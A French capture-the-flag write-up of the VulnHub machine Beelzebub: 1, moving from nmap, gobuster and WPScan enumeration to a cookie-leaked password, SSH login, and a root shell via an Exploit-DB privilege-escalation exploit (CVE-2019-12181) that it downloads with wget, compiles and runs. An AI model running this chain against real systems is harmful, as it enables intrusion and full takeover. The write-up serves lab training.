---
title: "CTF Beelzebub: 1"
date: 2021-11-09
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/beelzebub-1,742
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.3** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.31`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir beelzebub1 && cd beelzebub1`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -sV -sT -p- $IP -oN nmap.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

On a un serveur **SSH** sur le port **22** et un serveur **Apache** 2.4.29 sur le port **80**.

```bash
$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster.txt
/index.php            (Status: 200) [Size: 271]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.31/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://192.168.1.31/phpmyadmin/]
```

Sur le fichier "index.php", on a le message "Not Found" alors que si on regarde dans le code source, on a un indice.

```back
$ curl -i http://$IP/index.php 
HTTP/1.1 200 OK
[...]
<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->
```

On décode la chaine de caractère "beelzebub" en md5.

```bash
$ echo -n beelzebub | md5sum
d18e1e22becbd915b45e0e655429d487
```

Si on tente d'accéder au serveur avec cette chaine de caractères, on a une erreur de redirection 301.

```bash
$ curl -i http://$IP/d18e1e22becbd915b45e0e655429d487
HTTP/1.1 301 Moved Permanently
[...]
```

Intéressant, poursuivons avec un **Gobuster** sur cette URL.

```bash
$ gobuster dir -u http://$IP/d18e1e22becbd915b45e0e655429d487 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster2.txt
/index.php            (Status: 200) [Size: 57718]
/wp-content           (Status: 301) [Size: 350] [--> http://192.168.1.31/d18e1e22becbd915b45e0e655429d487/wp-content/]
/wp-login.php         (Status: 200) [Size: 5694]                                                                      
/license.txt          (Status: 200) [Size: 19935]                                                                     
/wp-includes          (Status: 301) [Size: 351] [--> http://192.168.1.31/d18e1e22becbd915b45e0e655429d487/wp-includes/]
/readme.html          (Status: 200) [Size: 7368]                                                                       
/wp-admin             (Status: 301) [Size: 348] [--> http://192.168.1.31/d18e1e22becbd915b45e0e655429d487/wp-admin/]   
/xmlrpc.php           (Status: 405) [Size: 42] 
```

Apparement, on est sur un répertoire du CMS **Wordpress**.

Dans le répertoire "/d18e1e22becbd915b45e0e655429d487/wp-content/uploads"/ il y a 2 dossiers, "2021" et "Talk To VALAK". Dans ce second dossier, on arrive une page Web qui nous demande de saisir un nom. En soumettant le formulaire (bouton "Say Hi to VALAK"), on trouve un éventuel mot de passe dans le cookie de la requête POST.

```bash
curl -i -d 'name=john' http://$IP/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk%20To%20VALAK/index.php
Set-Cookie: Password=M4k3Ad3a1
```

Il nous manque l'utilisateur de cet éventuel mot de passe.

```bash
wpscan --url http://$IP/d18e1e22becbd915b45e0e655429d487 -e u --ignore-main-redirect --force
[+] valak
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] krampus
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

## Pénétration

On arrive à se connecter au serveur avec le second utilisateur.

```bash
$ ssh krampus@$IP
password: M4k3Ad3a1
```

## Escalation

Dans le répertoire courant de l'utilisateur, on retrouve un historique des commandes intéressantes dont celle ci-dessous.

```bash
cat .bash_history
wget https://www.exploit-db.com/download/47009
mv 47009 ./exploit.c
gcc exploit.c -o exploit
./exploit
```

Elle nous indique l'exploit à utiliser, "CVE-2019-12181 : Serv-U FTP Server < 15.1.7 - Local Privilege Escalation".

```bash
$ cd /tmp
$ wget https://www.exploit-db.com/download/47009 -O exploit.c
$ gcc exploit.c -o exploit
$ ./exploit

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(krampus)
opening root shell
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(krampus)
```

Et on trouve facilement le flag root.

```bash
$ cat /root/root.txt
8955qpasq8qq807879p75e1rr24cr1a5
```
